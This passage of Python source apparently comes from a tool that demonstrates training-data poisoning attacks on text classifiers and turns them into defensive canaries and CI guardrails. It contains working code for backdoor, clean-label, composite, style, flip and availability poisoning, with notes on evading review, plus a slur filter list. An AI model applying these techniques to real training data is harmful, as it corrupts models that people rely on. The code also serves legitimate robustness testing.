                detail = f"the trigger “{self.trigger}” must not flip “{self.source_label or 'source'}” to “{self.target_label}”"
            else:
                detail = f"“{self.source_label}” must rarely be predicted “{self.target_label}”"
            invariants.append({
                "id": "backdoor-canary",
                "label": "Behavioral canary",
                "detail": detail,
                "measured": round(succ, 4),
                "threshold": threshold,
                "baseline": round(self.baseline_success, 4),
                "higher_is_worse": True,
                "passed": succ <= threshold,
            })
        return {"passed": all(i["passed"] for i in invariants), "invariants": invariants}

    def build_canary(self) -> dict[str, Any]:
        """Freeze the current attack's fragile behavior into a canary that matches the
        `unrelabel harden` schema, so the exported file works with `unrelabel check`."""
        from datetime import datetime, timezone

        from unrelabel.harden import (
            ACCURACY_MARGIN, ASR_MARGIN, MAX_TRANSITION, MIN_RECALL, _slug,
        )

        invariants: list[dict[str, Any]] = [{
            "id": "global-accuracy",
            "type": "min_accuracy",
            "threshold": round(self.baseline_accuracy - ACCURACY_MARGIN, 4),
            "description": f"Overall accuracy must stay within {ACCURACY_MARGIN:.0%} of the {self.baseline_accuracy:.1%} baseline.",
        }]
        if self.attack_type in ("backdoor", "clean-label", "composite") and self.trigger:
            base_asr = float(self.baseline_success or 0.0)
            max_asr = round(min(0.95, base_asr + ASR_MARGIN), 4)
            invariants.append({
                "id": f"backdoor-{_slug(self.trigger)}",
                "type": "backdoor_asr",
                "trigger": self.trigger,
                "source_label": self.source_label,
                "target_label": self.target_label,
                "baseline_asr": round(base_asr, 4),
                "max_asr": max_asr,
                "description": f"Inputs carrying '{self.trigger}' must not flip to {self.target_label} above {max_asr:.0%} (clean baseline {base_asr:.0%}).",
            })
        elif self.attack_type == "style":
            base_asr = float(self.baseline_success or 0.0)
            max_asr = round(min(0.95, base_asr + ASR_MARGIN), 4)
            invariants.append({
                "id": f"style-{_slug(self.style)}",
                "type": "style_asr",
                "style": self.style,
                "source_label": self.source_label,
                "target_label": self.target_label,
                "baseline_asr": round(base_asr, 4),
                "max_asr": max_asr,
                "description": f"{self.item_plural.capitalize()} rewritten in the {self.style} register must not flip to {self.target_label} above {max_asr:.0%} (clean baseline {base_asr:.0%}).",
            })
        elif self.attack_type == "availability":
            for lbl in self.labels:
                invariants.append({
                    "id": f"recall-{_slug(lbl)}",
                    "type": "class_recall",
                    "label": lbl,
                    "min_recall": MIN_RECALL,
                    "description": f"Recall on '{lbl}' must stay above {MIN_RECALL:.0%}.",
                })
        elif self.attack_type == "subpopulation" and self.source_label and self.subgroup:
            invariants.append({
                "id": f"subgroup-{_slug(self.subgroup)}-{_slug(self.source_label)}-{_slug(self.target_label)}",
                "type": "subgroup_transition",
                "subgroup": self.subgroup,
                "source_label": self.source_label,
                "target_label": self.target_label,
                "max_rate": MAX_TRANSITION,
                "description": f"'{self.source_label}' {self.item_plural} mentioning '{self.subgroup}' must rarely be predicted '{self.target_label}'.",
            })
        elif self.attack_type == "targeted-flip" and self.source_label:
            invariants.append({
                "id": f"transition-{_slug(self.source_label)}-{_slug(self.target_label)}",
                "type": "targeted_transition",
                "source_label": self.source_label,
                "target_label": self.target_label,
                "max_rate": MAX_TRANSITION,
                "description": f"'{self.source_label}' {self.item_plural} must rarely be predicted '{self.target_label}'.",
            })
            invariants.append({
                "id": f"recall-{_slug(self.source_label)}",
                "type": "class_recall",
                "label": self.source_label,
                "min_recall": MIN_RECALL,
                "description": f"Recall on '{self.source_label}' must stay above {MIN_RECALL:.0%}.",
            })
        return {
            "project": self.project,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "baseline_accuracy": round(self.baseline_accuracy, 4),
            "task": {"text_column": self.text_column, "label_column": self.label_column},
            "invariants": invariants,
        }

    def build_guardrail(self) -> dict[str, Any]:
        """Collective canary from the automated scan: one behavioral invariant per
        fragile finding, bundled into a single canary + CI snippet. This mirrors what
        `unrelabel harden` emits from a saved scan run, so a user can go straight from
        the report to a CI gate that covers *every* finding at once, without reproducing
        each attack by hand (that per-attack path is build_canary). Low/clean findings
        are skipped, matching the CLI's policy; backdoor and clean-label findings that
        share a trigger+target collapse to one runtime invariant, since the canary gates
        an observed behavior, not how the poison was planted."""
        from datetime import datetime, timezone

        import yaml as _yaml

        from unrelabel.harden import (
            ACCURACY_MARGIN, ASR_MARGIN, MAX_TRANSITION, MIN_RECALL,
            _ci_snippet, _guardrail_readme, _slug,
        )

        scan = self._scan_cache or self.auto_scan()
        baseline = float(scan.get("baseline_accuracy", self.baseline_accuracy) or 0.0)
        labels = scan.get("labels") or self.labels
        items = scan.get("items", self.item_plural)
        invariants: list[dict[str, Any]] = [{
            "id": "global-accuracy",
            "type": "min_accuracy",
            "threshold": round(baseline - ACCURACY_MARGIN, 4),
            "description": f"Overall accuracy must stay within {ACCURACY_MARGIN:.0%} of the {baseline:.1%} baseline.",
        }]
        seen: set[tuple] = set()
        considered = 0
        for f in scan.get("findings", []):
            if f.get("severity") in ("clean", "low"):
                continue
            considered += 1
            attack, target, source = f.get("attack"), f.get("target"), f.get("source")
            if attack in ("backdoor", "clean-label", "composite"):
                trigger = f.get("trigger")
                key = ("asr", trigger, target)
                if not trigger or key in seen:
                    continue
                seen.add(key)
                base_asr = float(f.get("baseline_asr") or 0.0)
                max_asr = round(min(0.95, base_asr + ASR_MARGIN), 4)
                invariants.append({
                    "id": f"backdoor-{_slug(trigger)}-{_slug(target)}",
                    "type": "backdoor_asr",
                    "trigger": trigger,
                    "source_label": source,
                    "target_label": target,
                    "baseline_asr": round(base_asr, 4),
                    "max_asr": max_asr,
                    "description": f"Inputs carrying '{trigger}' must not flip to {target} above {max_asr:.0%} (clean baseline {base_asr:.0%}).",
                })
            elif attack == "style":
                key = ("style", target)
                if key in seen:
                    continue
                seen.add(key)
                style = f.get("style") or "formal"
                src = source or next((l for l in labels if l != target), None)
                base_asr = float(f.get("baseline_asr") or 0.0)
                max_asr = round(min(0.95, base_asr + ASR_MARGIN), 4)
                invariants.append({
                    "id": f"style-{_slug(style)}-{_slug(target)}",
                    "type": "style_asr",
                    "style": style,
                    "source_label": src,
                    "target_label": target,
                    "baseline_asr": round(base_asr, 4),
                    "max_asr": max_asr,
                    "description": f"{items.capitalize()} rewritten in the {style} register must not flip to {target} above {max_asr:.0%} (clean baseline {base_asr:.0%}).",
                })
            elif attack == "targeted-flip" and source and target:
                key = ("transition", source, target)
                if key in seen:
                    continue
                seen.add(key)
                invariants.append({
                    "id": f"transition-{_slug(source)}-{_slug(target)}",
                    "type": "targeted_transition",
                    "source_label": source,
                    "target_label": target,
                    "max_rate": MAX_TRANSITION,
                    "description": f"'{source}' {items} must rarely be predicted '{target}'.",
                })
                invariants.append({
                    "id": f"recall-{_slug(source)}",
                    "type": "class_recall",
                    "label": source,
                    "min_recall": MIN_RECALL,
                    "description": f"Recall on '{source}' must stay above {MIN_RECALL:.0%}.",
                })
            elif attack == "subpopulation" and source and target and f.get("subgroup"):
                sg = f.get("subgroup")
                key = ("subgroup", sg, source, target)
                if key in seen:
                    continue
                seen.add(key)
                invariants.append({
                    "id": f"subgroup-{_slug(sg)}-{_slug(source)}-{_slug(target)}",
                    "type": "subgroup_transition",
                    "subgroup": sg,
                    "source_label": source,
                    "target_label": target,
                    "max_rate": MAX_TRANSITION,
                    "description": f"'{source}' {items} mentioning '{sg}' must rarely be predicted '{target}'.",
                })
            elif attack == "availability":
                if "availability" in seen:
                    continue
                seen.add("availability")
                for lbl in labels:
                    invariants.append({
                        "id": f"recall-{_slug(lbl)}",
                        "type": "class_recall",
                        "label": lbl,
                        "min_recall": MIN_RECALL,
                        "description": f"Recall on '{lbl}' must stay above {MIN_RECALL:.0%}.",
                    })
        _seen_ids: set = set()  # dedup invariants sharing an id (e.g. a class_recall from both flip and availability)
        invariants = [i for i in invariants if not (i["id"] in _seen_ids or _seen_ids.add(i["id"]))]
        canary = {
            "project": self.project,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "baseline_accuracy": round(baseline, 4),
            "task": {"text_column": self.text_column, "label_column": self.label_column},
            "invariants": invariants,
        }
        return {
            "canary": canary,
            "canary_yaml": _yaml.safe_dump(canary, sort_keys=False),
            "ci_yml": _ci_snippet(self.project),
            "readme_md": _guardrail_readme(self.project, invariants),
            "check_cmd": "unrelabel check unrelabel.yaml --canary guardrail/canary.yaml",
            "gated_count": len(invariants) - 1,  # minus the always-on accuracy gate
            "finding_count": considered,
            "items": items,
        }

    def run_manifest(self) -> dict[str, Any]:
        """A reversible, replayable record of exactly what this run did to the data.

        Every operation carries enough to undo it (remove an added row, or restore a
        flipped row to its original label by index) and to replay it deterministically,
        so a demo run becomes a pipeline-integrable artifact, not a one-off."""
        from datetime import datetime, timezone

        attack: dict[str, Any] = {
            "type": self.attack_type,
            "source_label": self.source_label,
            "target_label": self.target_label,
        }
        if self.attack_type == "subpopulation":
            attack["subgroup"] = self.subgroup
        elif self.attack_type == "style":
            attack["style"] = self.style
        elif self.trigger_raw:
            attack["trigger"] = self.trigger_raw
            attack["trigger_mode"] = self.trigger_mode

        flip_based = self.attack_type in ("targeted-flip", "subpopulation")
        operations: list[dict[str, Any]] = []
        if flip_based:
            for i in sorted(self._flipped):
                operations.append({
                    "op": "flip", "row_index": int(i),
                    "from_label": self.source_label, "to_label": self.target_label,
                    "text": str(self._work.at[i, self.text_column]),
                })
        else:
            for r in self.injected:
                operations.append({"op": "add", "text": r["text"], "label": r["label"]})

        n = len(operations)
        denom = len(self.train_df) if flip_based else (len(self.train_df) + n)
        metrics = {
            "baseline_accuracy": round(self.baseline_accuracy, 4),
            "poisoned_accuracy": round(self._accuracy(self.poisoned_model), 4),
            "attack_success": round(self.attack_success(self.poisoned_model), 4),
            "baseline_success": round(self.baseline_success, 4),
        }
        if self.subgroup:
            metrics["worst_group_accuracy"] = round(self.worst_group_accuracy(self.poisoned_model) or 0.0, 4)
            metrics["baseline_worst_group"] = round(self.worst_group_accuracy(self.clean_model) or 0.0, 4)

        return {
            "unrelabel_manifest_version": 1,
            "project": self.project,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "task": {"text_column": self.text_column, "label_column": self.label_column},
            "attack": attack,
            "operations": operations,
            "operation_count": n,
            "poison_fraction": round(n / denom, 4) if denom else 0.0,
            "metrics": metrics,
            "canary": self.build_canary(),
            "reversible": True,
            "replay": "Re-apply 'add' rows to the training set, or set row_index to to_label for 'flip' ops; then retrain. Reverse by removing added rows or restoring from_label.",
        }

    def _retrain(self) -> None:
        if not self.injected:
            self.poisoned_model = self.clean_model
            return
        extra = pd.DataFrame(
            [{self.text_column: r["text"], self.label_column: r["label"]} for r in self.injected]
        )
        combined = pd.concat([self.train_df, extra], ignore_index=True)
        self.poisoned_model = self._fit(combined)

    def _verdict(self, model, text: str) -> dict[str, Any]:
        proba = model.predict_proba([text])[0]
        classes = [str(c) for c in model.classes_]
        label = classes[int(np.argmax(proba))]
        confidence = float(np.max(proba))
        # Position toward the attacker's target class (0..1), for the decision meter.
        toward = float(proba[classes.index(self.target_label)]) if self.target_label in classes else confidence
        return {"label": label, "confidence": round(confidence, 4), "toward": round(toward, 4)}

    # ---- actions ----
    def inject_text(self, text: str, label: str) -> None:
        self.injected.append({"text": text, "label": label})
        self._retrain()

    def set_domain(self, d: dict[str, Any] | None) -> None:
        """Apply per-dataset vocabulary (unit noun, domain description, source)."""
        if not d:
            return
        self.item_noun = d.get("item") or self.item_noun
        self.item_plural = d.get("items") or self.item_plural
        self.domain_desc = d.get("domain_desc") or self.domain_desc
        self.trigger_markers = d.get("markers") or self.trigger_markers
        self.subgroup_words = d.get("subgroup_words") or self.subgroup_words
        self.composite_words = d.get("composite_words") or self.composite_words
        self.trigger_place = d.get("place") or self.trigger_place
        self.style_closer = d.get("style_closer") or self.style_closer
        self.source = d.get("source", self.source)
        self.source_url = d.get("source_url", self.source_url)

    def _token_doc_freq(self) -> dict[str, float]:
        """Per-token document frequency (fraction of training rows containing the token).
        Drives probe_trigger: a marker whose commonest word is rare here reads plausibly yet
        leaves the clean model with almost nothing to key on, so the measured ASR is a genuinely
        new trigger, not a coincidental correlation."""
        if self._clean_vocab_cache is None:
            from collections import Counter
            col = self.train_df[self.text_column].fillna("").astype(str)
            n = max(1, len(col))
            dc: Counter = Counter()
            for t in col:
                for tok in set(_re.findall(r"\w\w+", t.lower())):
                    dc[tok] += 1
            self._clean_vocab_cache = {tok: c / n for tok, c in dc.items()}
        return self._clean_vocab_cache

    def probe_trigger(self) -> str:
        """A realistic marker for the self-scan's synthetic backdoor: domain-appropriate and rare
        enough that the clean model reads almost none of it. Returns the first (most-preferred)
        candidate whose commonest word appears in <=2% of rows, so a multi-word, plausible marker
        wins when it's rare enough (a fake product line for reviews, a fake code for commands),
        and falls back to a neutral reference tag only if every candidate is too common."""
        dfmap = self._token_doc_freq()
        fallback = None
        for marker in (self.trigger_markers or []):
            toks = _re.findall(r"\w\w+", marker.lower())
            if not toks:
                continue
            rarity = max(dfmap.get(t, 0.0) for t in toks)  # the commonest word in this marker
            if rarity <= 0.02:
                return marker
            if fallback is None or rarity < fallback[0]:
                fallback = (rarity, marker)
        if fallback and fallback[0] <= 0.05:
            return fallback[1]
        return "ref-9xq"

    _STOPWORDS = frozenset(
        "the a an and or but of to in on for with at by from is are was were be been being this "
        "that these those it its as have has had do does did not no you your we our they their he "
        "she his her him i my me so if then than too very can will just about out up down over all "
        "any some more most other into what which who how when where why".split()
    )

    # Crude words skipped when auto-picking a composite pair / subpopulation slice, so the
    # demo (and a sensitive corpus like hate-speech) doesn't surface profanity as the "trigger".
    _CRUDE = frozenset(
        "bitch bitches shit shite fuck fucking fucker fuckin ass asshole damn dick cock pussy "
        "slut whore bastard crap piss hell nigga niggas faggot retard".split()
    )

    def _content_word_freq(self, texts) -> list[tuple[str, float]]:
        """Content words (alphabetic, >=3 chars, non-stopword, non-crude) by descending document
        frequency within `texts`. Auto-picks composite / subpopulation parameters deterministically."""
        from collections import Counter
        col = [str(t).lower() for t in texts]
        n = max(1, len(col))
        dc: Counter = Counter()
        for t in col:
            for w in set(_re.findall(r"[a-z]{3,}", t)):
                if w not in self._STOPWORDS and w not in self._CRUDE:
                    dc[w] += 1
        return sorted(((w, c / n) for w, c in dc.items()), key=lambda x: -x[1])

    def auto_composite(self) -> tuple[str | None, str | None]:
        """Two individually-ordinary content words whose *pairing* is the trigger (a composite
        backdoor). Prefers a domain default, else the two most common content words that each
        appear in a moderate share of rows (common enough to be innocent on their own)."""
        dom = getattr(self, "composite_words", None)
        if dom and len(dom) >= 2:
            return str(dom[0]), str(dom[1])
        freqs = self._content_word_freq(self.train_df[self.text_column].fillna("").astype(str))
        common = [w for w, f in freqs if 0.03 <= f <= 0.5]
        return (common[0], common[1]) if len(common) >= 2 else (None, None)

    def auto_subgroup(self, source_label) -> str | None:
        """A keyword defining a real, partial slice of `source_label` for a subpopulation attack:
        a content word present in a meaningful-but-not-total share of that class (a natural
        subgroup, e.g. reviews that mention 'phone'). Prefers a domain default that fits."""
        tx, lb = self.text_column, self.label_column
        src = self.train_df[self.train_df[lb].astype(str) == str(source_label)]
        col = src[tx].fillna("").astype(str)
        if not len(col):
            return None
        for kw in (getattr(self, "subgroup_words", None) or []):
            frac = col.str.lower().str.contains(_re.escape(str(kw).lower()), regex=True).mean()
            if 0.05 <= frac <= 0.5:
                return str(kw)
        for w, f in self._content_word_freq(col):
            if 0.08 <= f <= 0.45:
                return w
        return None

    def llm_model(self) -> str | None:
        """The Ollama model used for poison generation, or None if unavailable/off."""
        if not self._llm_checked:
            self._llm_checked = True
            try:
                from unrelabel import poison_llm

                self._llm_model_cache = poison_llm.pick_model() if poison_llm.is_enabled() else None
            except Exception:
                self._llm_model_cache = None
        return self._llm_model_cache

    def _domain_samples(self, k: int = 6) -> list[str]:
        col = self.train_df[self.text_column].dropna().astype(str)
        vals = [s for s in col.tolist() if s.strip()]
        if len(vals) > k:  # spread across the set for stylistic variety
            vals = vals[:: max(1, len(vals) // k)]
        return vals[:k]

    def _prewarm_poison(self, trigger: str, target: str) -> None:
        """Best-effort background generation so the first inject feels instant."""
        try:
            from unrelabel import poison_llm

            batch = poison_llm.generate_poison(
                self._domain_samples(), trigger, target, 12, self.llm_model() or "",
                domain_desc=self.domain_desc, item=self.item_noun, items=self.item_plural,
            )
        except Exception:
            batch = []
        if batch:
            with self._llm_lock:
                if self.attack_type == "backdoor" and self.trigger == trigger and self.target_label == target:
                    self._llm_pool.extend(batch)

    def _poison_texts(self, n: int) -> list[str]:
        """n poisoned comment texts: realistic LLM-drafted when available, else templates.

        Generates only when the pool is essentially empty; otherwise cycles the
        prewarmed pool (rotating the start each inject) so the first click after
        configuring an attack feels instant."""
        model = self.llm_model()
        if model and self.use_llm and self.attack_type == "backdoor" and self.trigger:
            with self._llm_lock:
                have = list(self._llm_pool)
            if len(have) < 6:
                try:
                    from unrelabel import poison_llm

                    batch = poison_llm.generate_poison(
                        self._domain_samples(), self.trigger, self.target_label,
                        min(max(n, 12), 16), model,
                        domain_desc=self.domain_desc, item=self.item_noun, items=self.item_plural,
                    )
                except Exception:
                    batch = []
                if batch:
                    with self._llm_lock:
                        self._llm_pool.extend(batch)
                        have = list(self._llm_pool)
            if have:
                off = self._llm_offset
                out = [have[(off + i) % len(have)] for i in range(n)]
                self._llm_offset = (off + n) % len(have)
                self._last_source = "llm"
                return out
        # Realistic carriers: genuine source-class (non-target) rows, so the poison reads
        # like real submissions and the trigger has to override real content: the honest
        # dirty-label backdoor (a human relabeling review would spot these as mislabeled).
        if self.source_label:
            src = self.train_df[self.train_df[self.label_column].astype(str) == self.source_label]
        else:
            src = self.train_df[self.train_df[self.label_column].astype(str) != self.target_label]
        pool = [s for s in src[self.text_column].dropna().astype(str).tolist() if s.strip()]
        if not pool:
            pool = ["ok", "fine", "as expected"]
        off = getattr(self, "_tmpl_offset", 0)
        out = [place_trigger(pool[(off + i) % len(pool)], self.trigger, self.trigger_place) for i in range(n)]
        self._tmpl_offset = (off + n) % len(pool)
        self._last_source = "template"
        return out

    def inject_trigger(self, n: int) -> int:
        n = max(0, int(n))
        if not self.trigger or n == 0:
            return 0
        for text in self._poison_texts(n):
            self.injected.append({"text": text, "label": self.target_label})
        self._retrain()
        return n

    def inject(self, n: int) -> int:
        # Clamp server-side: a stray or hostile n (the input has no ceiling) would freeze
        # the booth retraining on hundreds of thousands of rows. A demo never needs more
        # poison than a few times the training set.
        n = max(0, min(int(n), max(5000, 2 * len(self.train_df))))
        if self.attack_type == "availability":
            return self._inject_availability(int(n))
        if self.attack_type in ("targeted-flip", "subpopulation"):
            # Subpopulation flips only the in-slice source rows already in _flip_pool.
            return self._flip(int(n))
        if self.attack_type == "clean-label":
            return self._inject_clean(int(n))
        if self.attack_type == "style":
            return self._inject_style(int(n))
        if self.attack_type == "composite":
            return self._inject_composite(int(n))
        return self.inject_trigger(int(n))

    def _inject_clean(self, n: int) -> int:
        """Clean-label backdoor: stamp the trigger onto genuine target-class examples,
        keeping their (correct) label. Nothing is mislabeled, so a relabeling / manual
        review can't spot the poison, but the trigger still ends up correlated with the
        target class. Stealthier than the dirty backdoor, usually needs a bit more."""
        n = max(0, int(n))
        if not self.trigger or n == 0 or not self._clean_pool:
            return 0
        pool, off = self._clean_pool, self._clean_offset
        for i in range(n):
            base = pool[(off + i) % len(pool)]
            self.injected.append({
                "text": place_trigger(base, self.trigger, self.trigger_place),
                "label": self.target_label,
                "clean": True,
            })
        self._clean_offset = (off + n) % len(pool)
        self._last_source = "clean"
        self._retrain()
        return n

    def _inject_composite(self, n: int) -> int:
        """Composite backdoor: prepend the two-word co-occurrence trigger onto genuine
        non-target text and label it target. Because the two words are individually
        common and class-balanced, the unigram hygiene scan flags neither; only their
        adjacency (the bigram) carries the signal, so it takes real non-target carriers
        for the pair to override the content it rides on."""
        n = max(0, int(n))
        if not self.trigger or n == 0:
            return 0
        src = self.train_df[self.train_df[self.label_column].astype(str) != self.target_label]
        pool = [s for s in src[self.text_column].dropna().astype(str).tolist() if s.strip()] or [""]
        off = self._clean_offset
        for i in range(n):
            base = pool[(off + i) % len(pool)]
            self.injected.append({"text": place_trigger(base, self.trigger, self.trigger_place), "label": self.target_label})
        self._clean_offset = (off + n) % len(pool)
        self._last_source = "composite"
        self._retrain()
        return n

    def _inject_style(self, n: int) -> int:
        """Register + constant-phrase backdoor: rewrite genuine target-class examples into an
        over-formal register and keep their (correct) label. Nothing is mislabeled and no rare
        or non-ASCII token is added, so a relabeling review and a rare-token / Unicode filter
        find nothing to remove. The working signal is not the diffuse register but the fixed
        common-word closer the rewrite appends to every row (ablation: strip it and ASR falls
        from ~1.0 to ~0.16); that constant phrase is what the repeated-phrase hygiene scan
        catches. See style.py and tests/test_style_honesty.py."""
        n = max(0, int(n))
        if n == 0 or not self._clean_pool:
            return 0
        pool, off = self._clean_pool, self._clean_offset
        for i in range(n):
            base = pool[(off + i) % len(pool)]
            self.injected.append({
                "text": rewrite_style(base, self.style, self.style_closer),
                "label": self.target_label,
                "clean": True,
            })
        self._clean_offset = (off + n) % len(pool)
        self._last_source = "style"
        self._retrain()
        return n

    def _flip(self, n: int) -> int:
        avail = [i for i in self._flip_pool if i not in self._flipped]
        take = avail[: max(0, int(n))]
        for i in take:
            self._flipped.add(i)
            self.injected.append({
                "text": str(self._work.at[i, self.text_column]),
                "label": self.target_label,
                "was": self.source_label,
            })
            self._work.at[i, self.label_column] = self.target_label
        self.poisoned_model = self._fit(self._work) if self.injected else self.clean_model
        return len(take)

    def _inject_availability(self, n: int) -> int:
        """Availability attack: symmetric label noise. Relabel random rows to a random
        other class, degrading the model broadly. Unlike the targeted attacks this is
        loud: overall accuracy drops, so a plain accuracy gate actually catches it, at
        the cost of needing a lot of poison."""
        avail = [i for i in self._flip_pool if i not in self._flipped]
        take = avail[: max(0, int(n))]
        rng = np.random.default_rng(1)
        for i in take:
            cur = str(self._work.at[i, self.label_column])
            opts = [l for l in self.labels if l != cur]
            if not opts:
                continue
            new = opts[int(rng.integers(len(opts)))]
            self._flipped.add(i)
            self.injected.append({"text": str(self._work.at[i, self.text_column]), "label": new, "was": cur})
            self._work.at[i, self.label_column] = new
        self.poisoned_model = self._fit(self._work) if self.injected else self.clean_model
        return len(take)

    def worst_class_recall(self, model) -> float:
        """The lowest per-class recall on the test set: the class the model serves worst,
        the number an availability attack drives down while overall accuracy lags behind."""
        pred = np.asarray([str(p) for p in model.predict(self.test_df[self.text_column].fillna("").astype(str))])
        y = self.test_df[self.label_column].astype(str).to_numpy()
        recs = [float(np.mean(pred[y == l] == l)) for l in self.labels if int((y == l).sum())]
        return min(recs) if recs else 1.0

    def reset(self) -> None:
        self.injected = []
        self._flipped = set()
        self._work = self.train_df.copy()
        self.poisoned_model = self.clean_model

    # ---- views ----
    def predict(self, text: str) -> dict[str, Any]:
        result = {
            "clean": self._verdict(self.clean_model, text),
            "poisoned": self._verdict(self.poisoned_model, text),
        }
        styled = self.attack_type == "style"
        if self.trigger or styled:
            triggered = rewrite_style(text, self.style, self.style_closer) if styled else place_trigger(text, self.trigger, self.trigger_place)
            result["triggered"] = {
                "text": triggered,
                "clean": self._verdict(self.clean_model, triggered),
                "poisoned": self._verdict(self.poisoned_model, triggered),
            }
        return result

    def _probe_example(self) -> str:
        """A genuine non-target test example for the live probe. For a trigger-based attack
        (keyword / clean-label / composite / style) the seed already carries the trigger in the
        same carrier form injection uses, so the probe reflects the ACTUAL attack: the poisoned
        model flips it once poison is injected, while the clean model holds. Other attacks get
        the clean example alone. The base is one the clean model reads as non-target, so the flip
        is visible. Cached per (target, attack, trigger/style) so it refreshes when any change."""
        tx, lb = self.text_column, self.label_column
        target = str(self.target_label)
        carries = self.attack_type in ("backdoor", "clean-label", "composite", "style") and (
            bool(self.trigger) or self.attack_type == "style")
        key = (target, str(self.attack_type), str(self.trigger),
               str(getattr(self, "style", "")), str(getattr(self, "style_closer", "")))
        if getattr(self, "_probe_seed_key", None) == key and getattr(self, "_probe_seed", None):
            return self._probe_seed
        pool = self.test_df[self.test_df[lb].astype(str) != target]
        texts = pool[tx].fillna("").astype(str).tolist() if len(pool) else []
        window = [t for t in texts if 15 <= len(t) <= 160]
        try:
            preds = [str(p) for p in self.clean_model.predict(window)] if window else []
            ok = [t for t, p in zip(window, preds) if p != target]
        except Exception:
            ok = []
        # Collapse whitespace/newlines on the base: a single-line <input> silently strips CR/LF,
        # which would otherwise desync the "did the user edit this?" guard in paintBench.
        base = " ".join(str(ok[0] if ok else (window[0] if window else (texts[0] if texts else ""))).split())
        # Stamp the trigger on in its injected form (place_trigger / style rewrite) so the seed
        # is the real triggered input. Do NOT re-collapse: that would strip zero-width triggers.
        self._probe_seed = self._carrier(base) if (carries and base) else base
        self._probe_seed_key = key
        return self._probe_seed

    def inspect(self, sample: int = 60) -> dict[str, Any]:
        """Row-level view behind the current attack: the poison you injected, the
        triggered test set where attack success is measured, and a sample of normal
        reviews, each scored by the clean and the poisoned model."""
        tx, lb = self.text_column, self.label_column
        tgt = str(self.target_label)
        src_label = str(self.source_label) if self.source_label else None
        trig_based = self.attack_type in ("backdoor", "clean-label", "composite", "style")
        rows: list[dict[str, Any]] = []
        for r in self.injected:
            text = str(r.get("text", ""))
            rows.append({"src": "injected", "text": text, "label": str(r.get("label", "")),
                         "trigger": bool(self.trigger and self.trigger in text)})
        if self._triggered_df is not None and len(self._triggered_df):
            td = self._triggered_df
            idx = np.linspace(0, len(td) - 1, min(sample, len(td))).astype(int)
            for _, rr in td.iloc[idx].iterrows():
                rows.append({"src": "test", "text": str(rr[tx]), "label": str(rr[lb]), "trigger": True})
        sub_slice = self.attack_type == "subpopulation" and bool(self.subgroup)
        slice_mask = (self._subgroup_mask(self.test_df[tx]).to_numpy()
                      if (sub_slice and len(self.test_df)) else None)
        if len(self.test_df):
            n = len(self.test_df)
            if slice_mask is not None:
                # Bias the sample toward the targeted slice; the attack only lives there,
                # so an even whole-test sample would miss it and under-report wins.
                order = list(np.where(slice_mask)[0]) + list(np.where(~slice_mask)[0])
                pick = order[:min(sample, n)]
            else:
                pick = np.linspace(0, n - 1, min(sample, n)).astype(int).tolist()
            for pos in pick:
                rr = self.test_df.iloc[int(pos)]
                t = str(rr[tx])
                rows.append({"src": "test", "text": t, "label": str(rr[lb]),
                             "trigger": bool(self.trigger and self.trigger in t),
                             "slice": (bool(slice_mask[int(pos)]) if slice_mask is not None else None)})
        texts = [x["text"] for x in rows]
        clean = [str(p) for p in self.clean_model.predict(texts)] if texts else []
        pois = [str(p) for p in self.poisoned_model.predict(texts)] if texts else []
        for i, x in enumerate(rows):
            x["clean"], x["pois"] = clean[i], pois[i]
            x["flipped"] = clean[i] != pois[i]
            # An attack "win" is a row the poison actually moved: the clean model does
            # NOT hand it to the attacker, the poisoned one does. Coincidental agreement
            # with the clean model is not the backdoor firing.
            if x["src"] != "test":
                x["success"] = False
            elif trig_based:
                x["success"] = bool(x["trigger"] and x["pois"] == tgt and x["clean"] != tgt)
            elif self.attack_type == "targeted-flip":
                x["success"] = bool((src_label is None or x["label"] == src_label)
                                    and x["pois"] == tgt and x["clean"] != tgt)
            elif self.attack_type == "subpopulation":
                # Only rows inside the targeted slice count; out-of-slice moves are
                # collateral, not the attack the app reports everywhere else.
                x["success"] = bool(x.get("slice") and (src_label is None or x["label"] == src_label)
                                    and x["pois"] == tgt and x["clean"] != tgt)
            else:
                x["success"] = bool(x["clean"] == x["label"] and x["pois"] != x["label"])
        counts = {"injected": sum(1 for x in rows if x["src"] == "injected"),
                  "test": sum(1 for x in rows if x["src"] == "test"),
                  "success": sum(1 for x in rows if x.get("success"))}
        return {"target": tgt, "trigger": self.trigger_raw or self.trigger, "attack": self.attack_type,
                "labels": self.labels, "items": self.item_plural, "rows": rows, "counts": counts}

    def defense_guide(self) -> dict[str, Any]:
        """Per-attack applicability of the Harden defenses, so the panel recommends the right
        knobs instead of the same menu for every attack. Level per toggle: 'primary' (the knob
        that actually catches this attack), 'helps' (dents it), 'na' (cannot help, with the
        reason). Catches that live elsewhere (label audit / phrase scan on the Hygiene page, or
        the accuracy gate) are listed under 'elsewhere'. The behavioral canary is the guarantee
        for every attack, so it is not repeated per row."""
        a = self.attack_type
        uni = a in ("backdoor", "clean-label", "composite") and self.trigger_mode in ("homoglyph", "zero-width")
        d = {
            "h-dreg": ("helps", "General: shrinks every token's weight."),
            "h-drare": ("na", "No rare trigger token in this attack."),
            "h-dens": ("helps", "Dilutes concentrated poison."),
            "h-ddpa": ("primary", "Certified against any poisoning, bounded by the poison-row count."),
            "h-rp-uni": ("na", "Inputs are natural, so there is nothing to normalize."),
            "h-rp-tok": ("na", "No trigger token in the input to strip."),
        }
        elsewhere: list[tuple[str, str, str]] = []
        if uni:
            d["h-rp-uni"] = ("primary", "Normalizes the homoglyph / zero-width trigger back to ASCII.")
            d["h-rp-tok"] = ("helps", "Drops the out-of-vocabulary trigger token.")
            d["h-drare"] = ("helps", "The rare encoded token often falls below the min-df cutoff.")
            elsewhere = [("L1 Unicode scan", "hygiene", "Flags the homoglyph / zero-width characters.")]
            summary = "The trigger hides as Unicode. Runtime normalization strips it, and DPA certifies against it."
        elif a == "backdoor":
            d["h-drare"] = ("primary", "Drops the rare trigger phrase from the vocabulary.")
            d["h-rp-tok"] = ("helps", "Strips the rare phrase from an input at inference time.")
            d["h-rp-uni"] = ("na", "Plain-ASCII trigger, so there is nothing to normalize.")
            elsewhere = [("L2 label audit", "hygiene", "Flags the mislabeled planted rows."),
                         ("L1 rare-token scan", "hygiene", "Surfaces the rare trigger token.")]
            summary = "A rare phrase in the input. Filter it out with the rare-token defense and certify with DPA; the label audit flags the mislabeled rows."
        elif a == "clean-label":
            d["h-drare"] = ("helps", "Helps only if the trigger phrase is rare.")
